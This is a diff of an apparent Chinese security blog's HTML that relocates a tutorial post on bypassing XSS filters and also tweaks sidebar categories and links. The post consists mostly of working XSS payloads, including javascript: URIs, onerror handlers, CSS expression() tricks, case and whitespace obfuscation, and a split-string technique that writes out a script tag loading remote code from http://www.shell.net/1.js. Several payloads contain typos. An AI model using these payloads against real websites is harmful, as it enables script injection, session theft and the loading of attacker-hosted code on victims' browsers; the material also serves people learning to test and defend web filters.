class="line">&lt;script&gt;z=&apos;ript&gt;&quot;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=eval(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>上述代码的作用是引入一个字符串变量z，并且将下行代码拆分开来<br><code>bush
-document.write(&quot;&lt;script src=http://www.shell.net/1.js&gt;&lt;/script&gt;&quot;)
-`</code></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
 </div>
 
 
@@ -737,6 +676,80 @@ document.write(&quot;&lt;script src=http://www.shell.net/1.js&gt;&lt;/script&gt;
 <div class="article-categories">
   <span></span>
   <a class="article-category-link" href="/categories/编程开发/">编程开发</a>►<a class="article-category-link" href="/categories/编程开发/javascript/">javascript</a>
+</div>
+
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/09/28/绕过XSS-Filter及其它一些XSS构造方法/" title="绕过XSS-Filter" itemprop="url">绕过XSS-Filter</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
+		
+  <p class="article-time">
+    <time datetime="2017-09-28T08:42:19.000Z" itemprop="datePublished"> 发表于 2017-09-28</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>XSS-Filter一般是基于黑白名单的安全过滤策略，既把要处理的数据分成白名单和黑名单两大列表，白名单是可信数据，黑名单则相反。假定某个程序基于黑名单式的过滤策略，那么，当用户提交信息时，该系统的XSS-Filter会对所有数据进行检验，如检测到黑名单的数据，便进行拦截，编码和消毒过滤处理。<br>简单的来说，XSS-Filter实际上就是一段过滤函数。这段代码的功能封装在filter_xss()中，只要程序在处理输入时尽量使用该函数，就可以过滤常见的XSS。下面介绍一些常见的绕过方式。</p>
+<h3 id="1，利用-lt-gt-标记注射Html-Javascript。"><a href="#1，利用-lt-gt-标记注射Html-Javascript。" class="headerlink" title="1，利用&lt;&gt;标记注射Html/Javascript。"></a>1，利用&lt;&gt;标记注射Html/Javascript。</h3><p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘xss’);&lt;script&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="2，利用标签属性执行XSS"><a href="#2，利用标签属性执行XSS" class="headerlink" title="2，利用标签属性执行XSS"></a>2，利用标签属性执行XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=”javascript:alert(/xss/)”&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=”javascript:alert(‘xss’)”&gt;</span><br><span class="line">href=</span><br><span class="line">lowsrc=</span><br><span class="line">bgsound=</span><br><span class="line">background=</span><br><span class="line">value=</span><br><span class="line">action=</span><br><span class="line">dynsrc=</span><br></pre></td></tr></table></figure>
+<p>等都可以测试，但是前提是浏览器要支持伪协议</p>
+<h3 id="3，空格，回车，Tab"><a href="#3，空格，回车，Tab" class="headerlink" title="3，空格，回车，Tab"></a>3，空格，回车，Tab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javas	cript:alert(/xss/)” width=100&gt;</span><br><span class="line">&lt;img src=”javas</span><br><span class="line">cript:</span><br><span class="line">alert(/xss/)” width=100&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="4-对标签属性值转码，因为HTML支持ASCII码的特性"><a href="#4-对标签属性值转码，因为HTML支持ASCII码的特性" class="headerlink" title="4,对标签属性值转码，因为HTML支持ASCII码的特性"></a>4,对标签属性值转码，因为HTML支持ASCII码的特性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”javascript&amp;116&amp;#58alert(/xss/)”&gt;</span><br></pre></td></tr></table></figure>
+<p>自己根据ASCII码可以自己修改，当然了，也可以综合上面的Tab键使用</p>
+<h3 id="5，产生自己的事件"><a href="#5，产生自己的事件" class="headerlink" title="5，产生自己的事件"></a>5，产生自己的事件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=”#” onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+<p>注：onerror事件是IMG标记的一个事件，只要页面中发生错误，该事件立刻被激活。因为图片地址不正确，所有也被激活了<br>还有许多事件可以利用，下面只是一部分，感兴趣的可以自己再网上了解一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">onResume</span><br><span class="line">onSeek</span><br><span class="line">onTimeError</span><br><span class="line">onURLFlip</span><br></pre></td></tr></table></figure></p>
+<h3 id="6，利用CSS跨站剖析。"><a href="#6，利用CSS跨站剖析。" class="headerlink" title="6，利用CSS跨站剖析。"></a>6，利用CSS跨站剖析。</h3><p>XSS脚本的另一个载体是CSS样式表，使用CSS样式表执行JavaScript具有隐蔽，灵活多变等特点，但是CSS样式表有一个很大的缺点：各浏览器之间不能通用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-image:url(javascript:alert(&apos;xss&apos;))&quot;&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">	body &#123;background-image: url(&quot;javascript:alert(&apos;xss&apos;)&quot;);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div style=&quot;width: expreeion(alert(&apos;xss&apos;));&quot;&gt;</span><br><span class="line">&lt;img src=&quot;#&quot; style=&quot;xss:expreesion(alert(/xss/));&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>注：expreession执行JavaScript代码，expreession用来把css属性和jiavascript表达式关联起来。</p>
+<h3 id="7，扰乱过滤规则"><a href="#7，扰乱过滤规则" class="headerlink" title="7，扰乱过滤规则"></a>7，扰乱过滤规则</h3><p>其实就是综合前面讲述的各种技巧<br>转换大小写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG src=&quot;javascript:alter(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>大小写混写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iMg sRC=&quot;jAvAscript:alert(0);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>不用双引号用单引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;javascript:alerta(0);&apos;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>不使用引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(0);&gt;</span><br></pre></td></tr></table></figure></p>
+<p>用个反斜杠<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;mars.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim&quot;alt=&quot;mars&quot;&gt;</span><br><span class="line">&lt;img/src=&quot;javascript:alter(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>8，利用字符编码<br>利用XSS编码工具可以对XSS进行编码，javascript支持Unicode，escapes，十六进制，八进制等编码形式<br>9，拆分跨站法<br>有的地方存在XSS漏洞，但是网站管理员对字符长度写入做了限制，那么就可以用该方法绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos; src=ht&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;tp://ww&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;.net/1.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=&apos;ript&gt;&quot;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=eval(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>上述代码的作用是引入一个字符串变量z，并且将下行代码拆分开来<br><code>bush
+document.write(&quot;&lt;script src=http://www.shell.net/1.js&gt;&lt;/script&gt;&quot;)
+`</code></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/XSS/">XSS</a>
 </div>
 
 
@@ -977,7 +990,7 @@ document.write(&quot;&lt;script src=http://www.shell.net/1.js&gt;&lt;/script&gt;
   
 <div class="category-block">
   <h3 class="asidetitle">分类</h3>
-     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">27</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/">SEO</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/SEO/反向代理/">反向代理</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/php代码审计/">php代码审计</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/">杂七杂八</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/hexo/">hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/parrot/">parrot</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/rad-linux/">rad linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/windows7/">windows7</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">29</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/内网/">内网</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
 </div>
 
 
@@ -1050,6 +1063,12 @@ document.write(&quot;&lt;script src=http://www.shell.net/1.js&gt;&lt;/script&gt;
           <li>
             
             	<a href="http://www.runoob.com" target="_blank" title="学习各种编程脚本的好地方">W3C</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.91ri.org" target="_blank" title="内网挺可以">91安全</a>
             
           </li>
         
